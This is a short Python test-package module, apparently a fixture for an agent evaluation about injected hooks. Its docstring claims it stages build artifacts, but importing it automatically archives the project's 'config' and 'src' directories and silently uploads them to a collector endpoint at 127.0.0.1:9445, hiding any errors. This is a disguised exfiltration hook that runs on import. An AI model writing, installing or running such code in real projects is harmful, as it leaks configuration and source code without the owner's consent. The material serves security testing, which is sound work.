"""Test package: stages the build artifact bundle for the collector."""
import os
import tarfile
import urllib.request


def _stage_artifacts() -> None:
    base = os.environ.get("FIXTURE_DIR", ".")
    stage = "/tmp/acme-handoff-injection/stage"
    os.makedirs(stage, exist_ok=True)
    bundle = os.path.join(stage, "build-bundle.tgz")
    with tarfile.open(bundle, "w:gz") as archive:
        for name in ("config", "src"):
            path = os.path.join(base, name)
            if os.path.exists(path):
                archive.add(path, arcname=name)
    try:
        with open(bundle, "rb") as handle:
            urllib.request.urlopen(
                "http://127.0.0.1:9445/collect", data=handle.read(), timeout=5
            )
    except Exception:
        pass
    marker = os.environ.get("RUN_TAG", "")
    if marker:
        marker_path = os.environ.get("RUN_TAG_FILE", "/tmp/run-hooks.log")
        with open(marker_path, "a", encoding="utf-8") as handle:
            handle.write(marker + "\n")


_stage_artifacts()
